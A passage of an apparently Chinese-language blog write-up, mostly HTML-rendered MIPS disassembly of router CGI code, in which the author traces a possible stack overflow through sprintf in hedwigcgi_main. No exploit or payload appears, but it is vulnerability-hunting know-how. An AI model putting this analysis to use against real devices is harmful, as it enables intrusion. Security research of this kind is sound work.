class="hljs-built_in">s0</span><br><span class="hljs-number">00407</span>dc8 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_add_char                                undefined sobj_add_char()<br><span class="hljs-number">00407</span>dcc <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">40</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s2</span><br><span class="hljs-number">00407</span>dd0 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>dd4 <span class="hljs-number">13</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e24<br><span class="hljs-number">00407</span>dd8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">11</span> <span class="hljs-number">24</span>     _li        <span class="hljs-built_in">s1</span>,<span class="hljs-number">0x1</span><br>                     LAB_00407ddc                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>d64(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>ddc <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">15</span> <span class="hljs-number">16</span>     <span class="hljs-keyword">bne </span>       <span class="hljs-built_in">s0</span>,<span class="hljs-built_in">s5</span>,LAB_00407dec<br><span class="hljs-number">00407</span>de0 <span class="hljs-number">21</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a1</span>,<span class="hljs-built_in">s0</span><br><span class="hljs-number">00407</span>de4 <span class="hljs-number">0</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e24<br><span class="hljs-number">00407</span>de8 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">11</span> <span class="hljs-number">24</span>     _li        <span class="hljs-built_in">s1</span>,<span class="hljs-number">0x3</span><br>                     LAB_00407dec                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>ddc(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>dec <span class="hljs-number">6</span>c <span class="hljs-number">82</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7d94</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_add_char                  = <span class="hljs-number">0040</span>eb08<br><span class="hljs-number">00407</span>df0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>df4 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_add_char                                undefined sobj_add_char()<br><span class="hljs-number">00407</span>df8 <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">60</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s3</span><br><span class="hljs-number">00407</span>dfc <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>e00 <span class="hljs-number">09</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e28<br><span class="hljs-number">00407</span>e04 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">94</span> <span class="hljs-number">26</span>     _addiu     <span class="hljs-built_in">s4</span>,<span class="hljs-built_in">s4</span>,<span class="hljs-number">0x1</span><br>                     LAB_00407e08                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>d74(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>e08 <span class="hljs-number">6</span>c <span class="hljs-number">81</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7e94</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_strcmp                    = <span class="hljs-number">0040</span>e<span class="hljs-symbol">4b</span>0<br><span class="hljs-number">00407</span>e0c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>e10 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_strcmp                                  undefined sobj_strcmp()<br><span class="hljs-number">00407</span>e14 d8 <span class="hljs-built_in">a5</span> <span class="hljs-built_in">a5</span> <span class="hljs-number">24</span>     _addiu     <span class="hljs-built_in">a1</span>=&gt;DAT_0041a5d8,<span class="hljs-built_in">a1</span>,-<span class="hljs-number">0x5a28</span>                      = <span class="hljs-number">75</span>h    u<br><span class="hljs-number">00407</span>e18 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>e1c <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">v0</span>,<span class="hljs-built_in">zero</span>,LAB_00407e40<br><span class="hljs-number">00407</span>e20 <span class="hljs-number">21</span> <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _clear     <span class="hljs-built_in">s1</span><br>                     LAB_00407e24                                    XREF[<span class="hljs-number">6</span>]:     <span class="hljs-number">00407</span>d6c(<span class="hljs-keyword">j), </span><span class="hljs-number">00407</span>d7c(<span class="hljs-keyword">j), </span><br>                                                                                  <span class="hljs-number">00407</span>db8(<span class="hljs-keyword">j), </span><span class="hljs-number">00407</span>dd4(<span class="hljs-keyword">j), </span><br>                                                                                  <span class="hljs-number">00407</span>de4(<span class="hljs-keyword">j), </span><span class="hljs-number">00407</span>eec(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>e24 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">94</span> <span class="hljs-number">26</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">s4</span>,<span class="hljs-built_in">s4</span>,<span class="hljs-number">0x1</span><br>                     LAB_00407e28                                    XREF[<span class="hljs-number">3</span>]:     <span class="hljs-number">00407</span>d38(<span class="hljs-keyword">j), </span><span class="hljs-number">00407</span>d58(<span class="hljs-keyword">j), </span><br>                                                                                  <span class="hljs-number">00407</span>e00(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>e28 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">82</span>     <span class="hljs-keyword">lb </span>        <span class="hljs-built_in">s0</span>,<span class="hljs-number">0x0</span>(<span class="hljs-built_in">s4</span>)<br><span class="hljs-number">00407</span>e2c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>e30 c3 ff <span class="hljs-number">00</span> <span class="hljs-number">16</span>     <span class="hljs-keyword">bne </span>       <span class="hljs-built_in">s0</span>,<span class="hljs-built_in">zero</span>,LAB_00407d40<br><span class="hljs-number">00407</span>e34 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">24</span>     _li        <span class="hljs-built_in">v0</span>,<span class="hljs-number">0x1</span><br><span class="hljs-number">00407</span>e38 <span class="hljs-number">22</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407ec4<br><span class="hljs-number">00407</span>e3c <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">3</span>c     _lui       <span class="hljs-built_in">a1</span>,<span class="hljs-number">0x42</span><br>                     LAB_00407e40                                    XREF[<span class="hljs-number">2</span>]:     <span class="hljs-number">00407</span>e1c(<span class="hljs-keyword">j), </span><span class="hljs-number">00407</span>ed8(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>e40 <span class="hljs-number">9</span>c <span class="hljs-number">82</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7d64</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_get_string                = <span class="hljs-number">0040</span>e1cc<br><span class="hljs-number">00407</span>e44 <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">60</span> <span class="hljs-number">02</span>     <span class="hljs-keyword">move </span>      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s3</span><br>                     LAB_00407e48                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>ee4(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>e48 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;getenv                                       undefined sobj_get_string()<br>                                                                                     char * getenv(char * __name)<br><span class="hljs-number">00407</span>e4c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00407</span>e50 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>e54 <span class="hljs-number">21</span> <span class="hljs-number">20</span> c0 <span class="hljs-number">02</span>     <span class="hljs-keyword">move </span>      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s6</span><br><span class="hljs-number">00407</span>e58 <span class="hljs-number">78</span> <span class="hljs-number">80</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7f88</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_add_string                = <span class="hljs-number">0040</span>e<span class="hljs-symbol">8f</span>0<br><span class="hljs-number">00407</span>e5c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>e60 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_add_string                              undefined sobj_add_string()<br><span class="hljs-number">00407</span>e64 <span class="hljs-number">21</span> <span class="hljs-number">28</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>     _move      <span class="hljs-built_in">a1</span>,<span class="hljs-built_in">v0</span><br><span class="hljs-number">00407</span>e68 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>e6c <span class="hljs-number">06</span> <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s2</span>,<span class="hljs-built_in">zero</span>,LAB_00407e88<br><span class="hljs-number">00407</span>e70 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00407</span>e74 <span class="hljs-number">0</span>c <span class="hljs-number">83</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7cf4</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_del                       = <span class="hljs-number">0040</span>e724<br><span class="hljs-number">00407</span>e78 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>e7c <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_del                                     undefined sobj_del()<br><span class="hljs-number">00407</span>e80 <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">40</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s2</span><br><span class="hljs-number">00407</span>e84 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br>                     LAB_00407e88                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>e6c(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>e88 <span class="hljs-number">1</span>a <span class="hljs-number">00</span> <span class="hljs-number">60</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s3</span>,<span class="hljs-built_in">zero</span>,LAB_00407ef4<br><span class="hljs-number">00407</span>e8c <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">60</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s3</span><br><span class="hljs-number">00407</span>e90 <span class="hljs-number">0</span>c <span class="hljs-number">83</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7cf4</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_del                       = <span class="hljs-number">0040</span>e724<br><span class="hljs-number">00407</span>e94 <span class="hljs-number">3</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">bf </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">ra</span>,local_4(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>e98 <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-keyword">be </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s8</span>,local_8(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>e9c <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b7 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s7</span>,local_c(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ea0 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b6 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s6</span>,local_10(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ea4 <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">b5 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s5</span>,local_14(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ea8 <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b4 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s4</span>,local_18(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>eac <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b3 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s3</span>,local_1c(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>eb0 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b2 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s2</span>,local_20(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>eb4 <span class="hljs-number">1</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">b1 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s1</span>,local_24(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>eb8 <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b0 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s0</span>,local_28(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ebc <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jr </span>        <span class="hljs-built_in">t9</span>=&gt;sobj_del<br><span class="hljs-number">00407</span>ec0 <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bd </span><span class="hljs-number">27</span>     _addiu     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,<span class="hljs-number">0x40</span><br>                     LAB_00407ec4                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>e38(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>ec4 <span class="hljs-number">6</span>c <span class="hljs-number">81</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7e94</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_strcmp                    = <span class="hljs-number">0040</span>e<span class="hljs-symbol">4b</span>0<br><span class="hljs-number">00407</span>ec8 d8 <span class="hljs-built_in">a5</span> <span class="hljs-built_in">a5</span> <span class="hljs-number">24</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">a1</span>=&gt;DAT_0041a5d8,<span class="hljs-built_in">a1</span>,-<span class="hljs-number">0x5a28</span>                      = <span class="hljs-number">75</span>h    u<br><span class="hljs-number">00407</span><span class="hljs-built_in">ecc</span> <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_strcmp                                  undefined sobj_strcmp()<br><span class="hljs-number">00407</span>ed0 <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">40</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s2</span><br><span class="hljs-number">00407</span>ed4 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ed8 d9 ff <span class="hljs-number">40</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">v0</span>,<span class="hljs-built_in">zero</span>,LAB_00407e40<br><span class="hljs-number">00407</span>edc <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">3</span>c     _lui       <span class="hljs-built_in">a0</span>,<span class="hljs-number">0x42</span><br>                     LAB_00407ee0                                    XREF[<span class="hljs-number">3</span>]:     <span class="hljs-number">00407</span>d14(<span class="hljs-keyword">j), </span><span class="hljs-number">00407</span>d1c(<span class="hljs-keyword">j), </span><br>                                                                                  <span class="hljs-number">00407</span>d24(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>ee0 dc <span class="hljs-number">82</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7d24</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;getenv                         = <span class="hljs-number">004194</span>b0<br><span class="hljs-number">00407</span>ee4 d8 ff <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e48<br><span class="hljs-number">00407</span>ee8 dc <span class="hljs-built_in">a5</span> <span class="hljs-number">84</span> <span class="hljs-number">24</span>     _addiu     <span class="hljs-built_in">a0</span>=&gt;s_REMOTE_ADDR_0041a5dc,<span class="hljs-built_in">a0</span>,-<span class="hljs-number">0x5a24</span>            = <span class="hljs-string">&quot;REMOTE_ADDR&quot;</span><br>                     LAB_00407eec                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>db0(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>eec cd ff <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e24<br><span class="hljs-number">00407</span>ef0 <span class="hljs-number">21</span> <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _clear     <span class="hljs-built_in">s1</span><br>                     LAB_00407ef4                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>e88(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>ef4 <span class="hljs-number">3</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">bf </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">ra</span>,local_4(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ef8 <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-keyword">be </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s8</span>,local_8(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>efc <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b7 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s7</span>,local_c(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f00 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b6 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s6</span>,local_10(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f04 <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">b5 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s5</span>,local_14(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f08 <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b4 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s4</span>,local_18(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f0c <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b3 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s3</span>,local_1c(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f10 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b2 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s2</span>,local_20(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f14 <span class="hljs-number">1</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">b1 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s1</span>,local_24(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f18 <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b0 </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s0</span>,local_28(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>f1c <span class="hljs-number">08</span> <span class="hljs-number">00</span> e0 <span class="hljs-number">03</span>     <span class="hljs-keyword">jr </span>        <span class="hljs-built_in">ra</span><br><span class="hljs-number">00407</span>f20 <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bd </span><span class="hljs-number">27</span>     _addiu     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,<span class="hljs-number">0x40</span><br></code></pre></td></tr></table></figure><p>分析过程中并未发现漏洞出现在哪里,随即查看下哪些函数调用了这个函数,终于在hedwigcgi_main函数中发现了可能会导致栈溢出的危险函数sprintf,这部分的代码如下:</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">0040963</span>c <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">3</span>c     _lui       v0,<span class="hljs-number">0</span>x42<br><span class="hljs-symbol">00409640 </span><span class="hljs-number">44</span> <span class="hljs-number">80</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     lw         t9,-<span class="hljs-number">0</span>x7fbc(gp)=&gt;-&gt;sess_get_uid                   = <span class="hljs-number">00407</span>c98<br><span class="hljs-symbol">00409644 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     nop<br><span class="hljs-symbol">00409648 </span><span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     jalr       t9=&gt;sess_get_uid                                 undefined sess_get_uid()<br><span class="hljs-number">0040964</span>c <span class="hljs-number">21</span> <span class="hljs-number">20</span> a0 <span class="hljs-number">02</span>     _move      a0,s5<br><span class="hljs-symbol">00409650 </span><span class="hljs-number">10</span> <span class="hljs-number">00</span> bc <span class="hljs-number">8</span>f     lw         gp,local_4d8(sp)<br><span class="hljs-symbol">00409654 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     nop<br><span class="hljs-symbol">00409658 </span><span class="hljs-number">9</span>c <span class="hljs-number">82</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     lw         t9,-<span class="hljs-number">0</span>x7d64(gp)=&gt;-&gt;sobj_get_string                = <span class="hljs-number">0040e1</span>cc<br><span class="hljs-number">0040965</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     nop<br><span class="hljs-symbol">00409660 </span><span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     jalr       t9=&gt;sobj_get_string                              undefined sobj_get_string()<br><span class="hljs-symbol">00409664 </span><span class="hljs-number">21</span> <span class="hljs-number">20</span> a0 <span class="hljs-number">02</span>     _move      a0,s5<br><span class="hljs-symbol">00409668 </span><span class="hljs-number">10</span> <span class="hljs-number">00</span> bc <span class="hljs-number">8</span>f     lw         gp,local_4d8(sp)<br><span class="hljs-number">0040966</span>c <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">3</span>c     lui        a1,<span class="hljs-number">0</span>x42<br><span class="hljs-symbol">00409670 </span>d0 <span class="hljs-number">80</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     lw         t9,-<span class="hljs-number">0</span>x7f30(gp)=&gt;-&gt;sprintf                        = <span class="hljs-number">004197</span>f0<br><span class="hljs-symbol">00409674 </span><span class="hljs-number">21</span> <span class="hljs-number">38</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>     move       a3,v0<br><span class="hljs-symbol">00409678 </span><span class="hljs-number">21</span> <span class="hljs-number">30</span> <span class="hljs-number">40</span> <span class="hljs-number">02</span>     move       a2=&gt;s_/runtime/session_0041a5b8,s2               = <span class="hljs-string">&quot;/runtime/session&quot;</span><br><span class="hljs-number">0040967</span>c <span class="hljs-number">60</span> a8 a5 <span class="hljs-number">24</span>     addiu      a1=&gt;s_%s/%s/postxml_0041a860,a1,-<span class="hljs-number">0</span>x57a0          = <span class="hljs-string">&quot;%s/%s/postxml&quot;</span><br><span class="hljs-symbol">00409680 </span><span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     jalr       t9=&gt;sprintf                                      <span class="hljs-keyword">int</span> 